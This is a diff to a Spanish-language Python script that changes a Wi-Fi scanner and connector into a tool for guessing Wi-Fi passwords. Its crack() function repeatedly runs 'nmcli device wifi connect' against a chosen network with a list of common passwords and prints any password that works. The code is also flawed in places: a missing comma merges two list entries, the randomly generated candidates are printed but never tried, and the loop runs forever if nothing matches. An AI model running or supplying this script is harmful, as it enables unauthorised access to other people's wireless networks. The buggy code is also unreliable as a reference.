@@ -1,13 +1,18 @@
 import os
+import secrets
+import string
 
 contraseñas_comunes = ["12345678",
                        "123456789",
                        "password",
-                      	"1234567890",
-                      	"skibidi,
-                      	1234567,
-                      	pakistan123
-                        assword,
+                       "1234567890",
+                       "skibidi",
+                       "1234567",
+                       "pakistan123"
+                       "assword"]
+
+caracteres = string.ascii_letters + string.digits + string.punctuation
+generadas = set()
 
 
 def escanear_redes():
@@ -57,12 +62,25 @@ def escanear_redes():
         print("Error al escanear:", e)
         return []
 
-def crack(ssid, password):
+def crack(ssid):
+  exito = False
   while not exito:
     for i in contraseñas_comunes:
-      
+      cmd = ["nmcli", "device", "wifi", "connect", ssid, "password", i]
+      res = subprocess.run(cmd, capture_output=True, text=True)
+      if res.returncode == 0:
+            print("¡Conectado con éxito!")
+            exito = True
+            print(f"Contraseña para {ssid}: {i}")
+            break
+    
+    longitud = secrets.choice(range(8, 17))
+    cadena = ''.join(secrets.choice(caracteres) for _ in range(longitud))
 
-
+    if cadena not in generadas:
+        generadas.add(cadena)
+        print(cadena)
+    
 
 
 os.system("clear")
@@ -97,13 +115,8 @@ if sel.isdigit():
         # Si la red requiere contraseña (diferente de "--" o vacía)
         if seguridad and seguridad != "--":
             password = input(f"Contraseña para '{ssid_elegido}': ").strip()
-            cmd.extend(["password", password])
+            print("Crackeando...")
+            crack(ssid_elegido)
+      
 
-        print(f"\nConectando a '{ssid_elegido}'...")
-        res = subprocess.run(cmd, capture_output=True, text=True)
-
-        if res.returncode == 0:
-            print("¡Conectado con éxito!")
-        else:
-            print("Error al conectar:")
-            print(res.stderr.strip() if res.stderr else res.stdout.strip())
+        
